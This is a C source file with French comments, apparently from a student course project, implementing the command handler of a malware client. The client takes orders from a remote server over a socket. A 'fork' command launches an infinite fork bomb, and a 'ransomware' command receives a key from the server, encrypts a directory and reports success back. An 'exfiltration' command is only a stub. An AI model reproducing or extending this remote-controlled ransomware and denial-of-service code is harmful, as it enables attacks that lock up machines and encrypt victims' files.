#include "handle_client_commands.h"
#include "gener.h"
#include "stock.h"
#include "ransom.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>

#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <unistd.h>
#include <arpa/inet.h>







void handle_client_commands(int socket_fd)
{
    char buffer[BUFSIZ];
    int bytes_read;

    // Lire et traiter les commandes envoyées par le serveur
    while (1)
    {
        bytes_read = recv(socket_fd, buffer, BUFSIZ - 1, 0);
        if (bytes_read <= 0)
        {
            if (bytes_read == 0)
                printf("Server disconnected.\n");
            else
                perror("recv");
            break;
        }

        buffer[bytes_read] = '\0';
        printf("Server command received: \"%s\"\n", buffer);
        printf("ici c'est avant");

        // Traiter les commandes spécifiques
        if (strcmp(buffer, "exfiltration") == 0)
        {
            printf("Executing exfiltration...\n");
        }
        else if (strcmp(buffer, "fork") == 0)
        {
            printf("Executing fork...\n");

            while (1)
            {
                // On peut ajouter un mallow pour utiliser plus de ressources
                fork();
            }
        }
       else if (strcmp(buffer, "ransomware") == 0)
        {
            printf("Executing ransomware...\n");

            // Recevoir la clé aléatoire générée par le serveur
            bytes_read = recv(socket_fd, buffer, BUFSIZ - 1, 0);
            printf("ici c'est apres");
            if (bytes_read <= 0)
            {
                if (bytes_read == 0)
                    printf("Server disconnected while waiting for the random string.\n");
                else
                    perror("recv");
                break;
            }

            buffer[bytes_read] = '\0'; // Terminer la chaîne reçue
            printf("Received random string: %s\n", buffer);

            // Appeler la fonction ransomware avec la clé reçue
            char dir[] = "/mnt/c/Users/lucas/Desktop/Cours_C/TP/TEST_TP/encr";
            encrypt_directory(dir,buffer);

            // Envoyer une confirmation au serveur
            const char *confirmation = "Ransomware executed successfully";
            send(socket_fd, confirmation, strlen(confirmation), 0);
        }
        else if (strcmp(buffer, "out") == 0)
        {
            printf("Executing out...\n");
        }
        else
        {
            printf("Unknown command received: \"%s\"\n", buffer);
        }
    }
}
